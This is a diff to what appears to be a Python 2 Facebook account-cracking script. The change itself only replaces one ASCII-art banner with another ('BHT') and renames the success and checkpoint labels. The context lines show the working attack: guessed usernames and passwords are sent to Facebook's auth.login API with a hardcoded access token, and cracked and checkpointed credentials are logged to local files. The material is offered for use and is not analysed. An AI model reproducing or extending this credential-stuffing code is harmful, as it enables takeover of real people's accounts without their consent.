@@ -71,13 +71,61 @@ logo = """
                                                                         
 
 
- _____  ______  __  __  ______   ____    ____      
-/\___ \/\  _  \/\ \/\ \/\__  _\ /\  _`\ /\  _`\    
-\/__/\ \ \ \L\ \ \ \_\ \/_/\ \/ \ \ \L\_\ \ \/\ \  
-   _\ \ \ \  __ \ \  _  \ \ \ \  \ \  _\L\ \ \ \ \ 
-  /\ \_\ \ \ \/\ \ \ \ \ \ \_\ \__\ \ \L\ \ \ \_\ \
-  \ \____/\ \_\ \_\ \_\ \_\/\_____\\ \____/\ \____/
-   \/___/  \/_/\/_/\/_/\/_/\/_____/ \/___/  \/___/ 
+                                                                            
+
+                                                                            
+
+BBBBBBBBBBBBBBBBB        HHHHHHHHH     HHHHHHHHH     TTTTTTTTTTTTTTTTTTTTTTT
+
+B::::::::::::::::B       H:::::::H     H:::::::H     T:::::::::::::::::::::T
+
+B::::::BBBBBB:::::B      H:::::::H     H:::::::H     T:::::::::::::::::::::T
+
+BB:::::B     B:::::B     HH::::::H     H::::::HH     T:::::TT:::::::TT:::::T
+
+  B::::B     B:::::B       H:::::H     H:::::H       TTTTTT  T:::::T  TTTTTT
+
+  B::::B     B:::::B       H:::::H     H:::::H               T:::::T        
+
+  B::::BBBBBB:::::B        H::::::HHHHH::::::H               T:::::T        
+
+  B:::::::::::::BB         H:::::::::::::::::H               T:::::T        
+
+  B::::BBBBBB:::::B        H:::::::::::::::::H               T:::::T        
+
+  B::::B     B:::::B       H::::::HHHHH::::::H               T:::::T        
+
+  B::::B     B:::::B       H:::::H     H:::::H               T:::::T        
+
+  B::::B     B:::::B       H:::::H     H:::::H               T:::::T        
+
+BB:::::BBBBBB::::::B     HH::::::H     H::::::HH           TT:::::::TT      
+
+B:::::::::::::::::B      H:::::::H     H:::::::H           T:::::::::T      
+
+B::::::::::::::::B       H:::::::H     H:::::::H           T:::::::::T      
+
+BBBBBBBBBBBBBBBBB        HHHHHHHHH     HHHHHHHHH           TTTTTTTTTTT      
+
+                                                                            
+
+                                                                            
+
+                                                                            
+
+                                                                            
+
+                                                                            
+
+                                                                            
+
+                                                                            
+
+
+
+
+
+
                                                    
                                                    
                                                           
@@ -290,13 +338,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + c + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[OK-JAHIED-SUCCESSFUL]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n' + '\x1b[1;92m  [Login Now]\n'
+                print '\x1b[1;92m[OK-BHT-SUCCESSFUL]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n' + '\x1b[1;92m  [Login Now]\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '|' + c + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + c + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;96m[CP-JAHIED-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 7 Days]\n'
+                print '\x1b[1;96m[CP-BHT-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 7 Days]\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + c + pass1 + '\n')
                 cps.close()
